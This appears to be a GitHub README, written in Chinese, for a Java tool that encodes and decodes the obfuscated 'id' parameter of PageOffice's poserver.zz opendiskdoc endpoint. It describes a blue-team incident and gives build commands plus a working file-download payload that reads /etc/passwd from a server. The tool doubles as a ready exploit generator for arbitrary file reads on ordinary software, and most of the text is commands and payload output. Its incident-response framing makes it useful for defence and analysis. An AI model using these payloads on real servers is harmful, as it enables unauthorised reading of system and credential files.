# PageOffice_FileDownload
## 分析
某次蓝队防守时发现流量告警，读取了服务器敏感文件。客户要求解密请求字符串，根据页面回显的版本从github找到相应jar进行审计。
<img width="434" alt="image" src="https://github.com/JosT4r/PageOffice_FileDownload/assets/104313845/32eebafd-c395-4db0-9848-562d906fa315">

## package
```
javac Main.java
jar -cvmf MANIFEST.MF PageOffice-FileDownload.jar *.class
```
## env
`jdk1.8`
## Usage
### 1. encode
```
java -jar PageOffice-FileDownload.jar encode /etc/passwd

encode payload:
poserver.zz?pgop=opendiskdoc&id=KmcgY3MtK3IpLSRfOXE9YmpkL2orbBdrKztnLDh2OCQpbSJyK2w4cj9uKzsXbiRqL2EXci9tIi0lYThjOCs5ciZjF2s=
```
### 2. decode
```
java -jar PageOffice-FileDownload.jar decode KmcgY3MtLG0jY2VxJnQjZSYxYjVlcStwOmMmcWVkOXEpbiZtKC58Ln8tOXIXcDhzJCs

decode payload:
file=/etc/passwd&filename=1.txt&contenttype=application/octet-stream
```
